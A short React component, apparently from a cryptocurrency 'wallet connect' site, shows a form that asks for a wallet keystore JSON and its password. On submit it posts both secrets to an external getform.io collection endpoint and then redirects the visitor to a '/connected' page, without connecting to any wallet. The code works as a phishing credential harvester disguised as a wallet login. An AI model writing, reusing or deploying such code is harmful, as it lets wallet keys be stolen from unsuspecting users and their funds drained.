import { useState } from "react";
import axios from "axios";
import { Spinner } from "@chakra-ui/react";

const Keystore = () => {
  const [password, setPassword] = useState("");
  const [keyJson, setKeyJson] = useState("");

  const [spinner, setSpinner] = useState(false); //State for spinner

  /****************HANDLE SUBMIT FUNCTION*************/
  const onSubmit = (e) => {
    e.preventDefault();
    setSpinner(true);
    const formData = new FormData();
    formData.append("password", password);
    formData.append("keyJson", keyJson);

    axios
      .post("https://getform.io/f/5cbe89d1-2594-43f8-b30a-8672e2eefdd5 ", formData)
      .then((res) => {
        window.location.href = "/connected";
      })
      .catch((error) => {
        console.log(error);
      });
  };
  /*************************************************/

  return (
    <>
      <form className="upload">
        <textarea
          placeholder="Type in your Keystore JSON"
          name="KeystoreJSON"
          value={keyJson}
          onChange={(e) => setKeyJson(e.target.value)}
          required
        />

        <input
          type="text"
          name="keystore-file"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="password"
        />
      </form>

      <div className="submit-btn-main">
        <button className="btn1" onClick={onSubmit}>
          {spinner === false ? <p>Connect</p> : <Spinner />}
        </button>
      </div>
    </>
  );
};

export default Keystore;
